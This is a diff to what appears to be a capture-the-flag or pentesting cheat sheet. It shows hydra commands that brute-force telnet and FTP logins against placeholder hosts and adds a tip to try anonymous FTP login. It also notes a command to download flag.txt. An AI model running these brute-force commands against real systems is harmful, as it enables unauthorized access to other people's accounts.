@@ -122,7 +122,10 @@ hydra -l admin -P passlist.txt -o test.txt x.x.x.x telnet
 
 <details>
   <summary>Bruteforce FTP</summary>
-  
+
+```console
+    TRY user "annoymous" + no password
+  ```
 ```console
 hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x
 
@@ -131,6 +134,8 @@ hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x -s 221
 
 • Used to download the specific file from FTP to attacker or local machine
 get flag.txt ~/Desktop/filepath/flag.txt
+
+
 ```
 </details>
 
